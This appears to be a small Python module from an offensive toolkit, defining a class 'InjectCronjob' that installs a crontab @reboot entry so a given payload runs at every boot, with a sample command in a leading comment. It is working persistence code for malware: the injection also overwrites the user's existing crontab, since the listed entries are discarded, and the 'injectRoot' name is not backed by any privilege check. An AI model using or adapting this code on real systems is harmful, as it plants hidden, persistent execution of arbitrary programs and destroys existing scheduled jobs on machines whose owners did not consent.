'''
(crontab -l 2>/dev/null | echo "@reboot touch /home/test/Desktop/test.txt") | crontab -
'''

import os

class InjectCronjob:
    def __init__(self, payload):
        self.payload = payload
        self.currentUser = os.getlogin()

    def injectRoot(self):
        separation = os.path.split(self.payload)
        fileRooty = separation[0]
        fileName = separation[1]
        command = f'(crontab -l 2>/dev/null | echo "@reboot cd {fileRooty} && ./{fileName}") | crontab -'
        os.system(command)